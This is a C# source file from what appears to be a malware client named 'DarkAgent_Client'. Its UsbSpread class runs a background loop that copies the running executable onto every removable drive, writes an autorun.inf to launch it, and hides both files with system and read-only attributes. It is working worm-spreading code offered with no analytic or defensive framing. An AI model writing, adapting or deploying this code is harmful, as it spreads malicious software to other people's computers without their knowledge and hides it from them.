using System;
using System.Collections.Generic;
using System.Text;
using DarkAgent_Client.src.Utils;
using System.Threading;
using System.IO;
using System.Reflection;

namespace DarkAgent_Client.src.Features.Spreaders
{
    public class UsbSpread
    {

        public UsbSpread()
        {
            if(Settings.Spread_Usb)
            {
                Thread thread = new Thread(new ThreadStart(Spread));
                thread.Start();
            }
        }

        private void Spread()
        {
            FileInfo OwnFile = new FileInfo(Assembly.GetExecutingAssembly().Location);
            while(true)
            {
                Thread.Sleep(5000);
                foreach(DriveInfo info in DriveInfo.GetDrives())
                {
                    try
                    {
                        if(info.DriveType == DriveType.Removable)
                        {
                            StreamWriter writer = new StreamWriter(info.Name + "autorun.inf");
                            writer.WriteLine("[autorun]");
                            writer.WriteLine("open=" + OwnFile.Name);
                            writer.WriteLine("action=Run win32");
                            writer.Close();
                            File.Copy(OwnFile.FullName, info.Name + OwnFile.Name, true);
                            File.SetAttributes(info.Name + "autorun.inf", FileAttributes.Hidden | FileAttributes.ReadOnly | FileAttributes.System);
                            File.SetAttributes(info.Name + OwnFile.Name, FileAttributes.Hidden | FileAttributes.ReadOnly | FileAttributes.System);
                        }
                    }catch{ }
                }
            }
        }
    }
}